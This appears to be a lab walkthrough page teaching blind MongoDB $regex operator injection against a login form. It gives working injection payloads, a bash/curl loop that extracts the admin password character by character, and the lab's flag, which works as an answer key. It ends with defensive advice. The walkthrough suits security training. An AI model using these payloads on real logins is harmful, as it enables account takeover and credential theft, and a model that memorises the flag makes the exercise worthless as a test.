<h4>Step 1: Confirm the Injection Point</h4>
<p>
    Use <code>password[$ne]=</code> to confirm the login is vulnerable to operator injection.
    Note that the app only shows "Login successful": it does NOT reveal the password.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Confirm Injection</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>username=admin&amp;password[$ne]=<br>
        <span class="prompt">Output: </span>Login successful! Welcome, <strong>admin</strong>.<br>
        <span class="prompt">// Password is NOT displayed -- this is a blind scenario</span>
    </div>
</div>

<h4>Step 2: Test $regex Operator</h4>
<p>
    The <code>$regex</code> operator allows pattern matching. Use <code>^F</code> to test
    if the password starts with "F". Use <code>^X</code> as a negative control.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2: $regex Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>username=admin&amp;password[$regex]=^F<br>
        <span class="prompt">Output: </span><strong>Login successful!</strong> (starts with F)<br><br>
        <span class="prompt">Input: </span>username=admin&amp;password[$regex]=^X<br>
        <span class="prompt">Output: </span>Invalid credentials. (doesn't start with X)<br><br>
        <span class="prompt">Input: </span>username=admin&amp;password[$regex]=^FL<br>
        <span class="prompt">Output: </span><strong>Login successful!</strong> (starts with FL)
    </div>
</div>

<h4>Step 3: Character-by-Character Extraction</h4>
<p>
    By testing <code>^F</code>, <code>^FL</code>, <code>^FLA</code>, <code>^FLAG</code>,
    <code>^FLAG\{</code>, etc., we extract the password one character at a time.
    Login success = correct character, failure = wrong character.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Extraction Progress</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">^F </span> -> Login successful<br>
        <span class="prompt">^FL </span> -> Login successful<br>
        <span class="prompt">^FLA </span> -> Login successful<br>
        <span class="prompt">^FLAG </span> -> Login successful<br>
        <span class="prompt">^FLAG\{ </span> -> Login successful<br>
        <span class="prompt">^FLAG\{mg_ </span> -> Login successful<br>
        <span class="prompt">... </span> (continue for each character)<br>
        <span class="prompt">^FLAG\{mg_r3g3x_bl1nd_3xtr4ct\} </span> -> Login successful<br><br>
        <span class="prompt">Extracted: </span><strong>FLAG{mg_r3g3x_bl1nd_3xtr4ct}</strong>
    </div>
</div>

<h4>Step 4: Automated Extraction Script</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Bash Extraction Script</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>extracted=""<br>
        chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}'<br>
        for i in $(seq 0 30); do<br>
        &nbsp;&nbsp;for (( j=0; j&lt;${#chars}; j++ )); do<br>
        &nbsp;&nbsp;&nbsp;&nbsp;c="${chars:$j:1}"<br>
        &nbsp;&nbsp;&nbsp;&nbsp;escaped=$(printf '%s' "$extracted$c" | sed 's/[{}]/\\&amp;/g')<br>
        &nbsp;&nbsp;&nbsp;&nbsp;resp=$(curl -s "http://target/SQLi-Arena/mongodb/lab3" \<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--data-urlencode "login_submit=1" \<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--data-urlencode "username=admin" \<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--data-urlencode "password[\$regex]=^${escaped}")<br>
        &nbsp;&nbsp;&nbsp;&nbsp;if echo "$resp" | grep -q 'result-success'; then<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;extracted="${extracted}${c}"; break<br>
        &nbsp;&nbsp;&nbsp;&nbsp;fi<br>
        &nbsp;&nbsp;done<br>
        done<br>
        echo "Flag: $extracted"
    </div>
</div>

<h4>Step 5: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{mg_r3g3x_bl1nd_3xtr4ct}</code>.
</p>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> The <code>$regex</code> operator enables blind extraction
    by prefix-matching. Using <code>^known_prefix + test_char</code>, an attacker iterates
    through characters and uses login success/failure as an oracle. This is analogous to
    SQL blind injection with <code>SUBSTRING()</code>. With ~63 characters per position and
    ~28 positions, extraction requires ~1,764 requests maximum. Defense: cast all input to
    strings, or use a schema validation library that rejects operator objects.
</div>
